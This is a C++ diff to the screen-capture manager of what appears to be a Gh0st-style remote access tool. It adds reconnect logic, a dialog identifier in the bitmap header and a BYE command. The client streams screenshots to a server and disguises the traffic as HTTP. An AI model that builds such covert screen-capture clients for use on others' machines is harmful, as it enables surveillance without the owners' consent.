@@ -297,6 +297,14 @@ void CScreenManager::InitScreenSpy()
     }
 }
 
+BOOL CScreenManager::OnReconnect()
+{
+    m_SendFirst = FALSE;
+    BOOL r = m_ClientObject ? m_ClientObject->Reconnect(this) : FALSE;
+    Mprintf("CScreenManager OnReconnect '%s'\n", r ? "succeed" : "failed");
+    return r;
+}
+
 DWORD WINAPI CScreenManager::WorkThreadProc(LPVOID lParam)
 {
     CScreenManager *This = (CScreenManager *)lParam;
@@ -309,7 +317,6 @@ DWORD WINAPI CScreenManager::WorkThreadProc(LPVOID lParam)
     This->WaitForDialogOpen();
 
     clock_t last = clock();
-    This->SendFirstScreen();
 #if USING_ZLIB
     const int fps = 8;// 帧率
 #else
@@ -324,6 +331,16 @@ DWORD WINAPI CScreenManager::WorkThreadProc(LPVOID lParam)
     clock_t last_check = clock();
     timeBeginPeriod(1);
     while (This->m_bIsWorking) {
+        if (!This->IsConnected()) {
+            Sleep(50);
+            continue;
+        }
+        if (!This->m_SendFirst && This->IsConnected()) {
+            This->m_SendFirst = TRUE;
+            This->SendBitMapInfo();
+            Sleep(50);
+            This->SendFirstScreen();
+        }
         // 降低桌面检查频率，避免频繁的DC重置导致闪屏
         if (This->m_isGDI && This->IsRunAsService() && !This->m_virtual) {
             auto now = clock();
@@ -384,7 +401,7 @@ DWORD WINAPI CScreenManager::WorkThreadProc(LPVOID lParam)
 VOID CScreenManager::SendBitMapInfo()
 {
     //这里得到bmp结构的大小
-    const ULONG   ulLength = 1 + sizeof(BITMAPINFOHEADER) + sizeof(uint64_t);
+    const ULONG   ulLength = 1 + sizeof(BITMAPINFOHEADER) + 2 * sizeof(uint64_t);
     LPBYTE	szBuffer = (LPBYTE)VirtualAlloc(NULL,
                                             ulLength, MEM_COMMIT, PAGE_READWRITE);
     if (szBuffer == NULL)
@@ -393,6 +410,7 @@ VOID CScreenManager::SendBitMapInfo()
     //这里将bmp位图结构发送出去
     memcpy(szBuffer + 1, m_ScreenSpyObject->GetBIData(), sizeof(BITMAPINFOHEADER));
     memcpy(szBuffer + 1 + sizeof(BITMAPINFOHEADER), &m_conn->clientID, sizeof(uint64_t));
+    memcpy(szBuffer + 1 + sizeof(BITMAPINFOHEADER) + sizeof(uint64_t), &m_DlgID, sizeof(uint64_t));
     HttpMask mask(DEFAULT_HOST, m_ClientObject->GetClientIPHeader());
     m_ClientObject->Send2Server((char*)szBuffer, ulLength, 0);
     VirtualFree(szBuffer, 0, MEM_RELEASE);
@@ -420,7 +438,7 @@ void RunFileReceiver(CScreenManager *mgr, const std::string &folder)
     Mprintf("Enter thread RunFileReceiver: %d\n", GetCurrentThreadId());
     IOCPClient* pClient = new IOCPClient(mgr->g_bExit, true, MaskTypeNone, mgr->m_conn->GetHeaderEncType());
     if (pClient->ConnectServer(mgr->m_ClientObject->ServerIP().c_str(), mgr->m_ClientObject->ServerPort())) {
-        pClient->setManagerCallBack(mgr, CManager::DataProcess);
+        pClient->setManagerCallBack(mgr, CManager::DataProcess, CManager::ReconnectProcess);
         // 发送目录并准备接收文件
         char cmd[300] = { COMMAND_GET_FILE };
         memcpy(cmd + 1, folder.c_str(), folder.length());
@@ -461,6 +479,12 @@ void FinishSend(void* user)
 VOID CScreenManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
 {
     switch(szBuffer[0]) {
+    case COMMAND_BYE: {
+        Mprintf("[CScreenManager] Received BYE\n");
+        m_bIsWorking = FALSE;
+        m_ClientObject->StopRunning();
+        break;
+    }
     case COMMAND_SWITCH_SCREEN: {
         SwitchScreen();
         break;
@@ -471,6 +495,7 @@ VOID CScreenManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
         break;
     }
     case COMMAND_NEXT: {
+        m_DlgID = ulLength >= 9 ? *((uint64_t*)(szBuffer + 1)) : 0;
         NotifyDialogIsOpen();
         break;
     }
